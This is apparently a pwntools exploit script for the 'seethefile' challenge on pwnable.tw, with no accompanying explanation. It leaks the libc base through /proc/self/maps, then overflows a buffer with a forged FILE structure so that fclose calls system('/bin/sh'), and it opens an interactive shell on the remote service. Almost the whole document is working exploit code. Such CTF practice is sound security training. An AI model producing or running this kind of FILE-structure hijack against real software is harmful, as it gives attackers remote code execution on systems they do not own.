from pwn import *


libc = ELF('./libc_32.so.6')
elf = ELF('./seethefile')

context(terminal=['tmux', 'new-window'])
context.log_level = 'DEBUG'


debug_set_1 = '''
    set {int}0x0804b108 = 0x804b0c0
    b fclose

    b *0xf7e7cfa5
    commands
        set {char [8]} 0x0804b0c0="/bin/sh"
        set $eax=0x0804b0c0
        set {int} 0x804b0c8=0xf7e5a940
    end
    '''

debug_set_2 = '''
    b *0xf7f3d4c2
    commands
        set {char [8]} 0x0804b064="/bin/sh"
    end
    '''

debug_set_3 = '''
    b *0xf7f3e1f9
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(["/tmp/ld-2.23.so", "./seethefile"], env={"LD_PRELOAD":"./libc_32.so.6"})
    gdb.attach(p)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(["/tmp/ld-2.23.so", "./seethefile"], env={"LD_PRELOAD":"./libc_32.so.6"})
    gdb.attach(p)
else:
    #p = process("./seethefile", env=env)
    p = remote('chall.pwnable.tw', 10200)

p.sendline("1")

p.recvuntil(":")
p.sendline("/proc/self/maps")

p.recvuntil("Your choice :")
p.sendline("2")
p.recvuntil(":")
p.sendline("2")

p.recvuntil(":")
p.sendline("3")
p.recvline()
libc_base = p.recv(8)


print("libc_base :: " + libc_base)


libc.address = int("0x" + libc_base, 16)

system = libc.symbols['system']

print("system :: " + hex(system))

p.recvuntil(":")
p.sendline("4")
p.recvuntil(":")
p.sendline("1")
p.recvuntil(":")
p.sendline("asdmaldlakjdklalkasjdlkajsd")


p.sendline("5")
p.recvuntil(":")
p.sendline("/bin/sh\x00caaadaaaeaaafaaagaaahaaa" + p32(0x0804b260) + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa" + p32(0x0804b0c0) + p32(0x0804b280) + "laaamaaanaaaoaaa" + p32(system) +"qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab")

p.interactive()
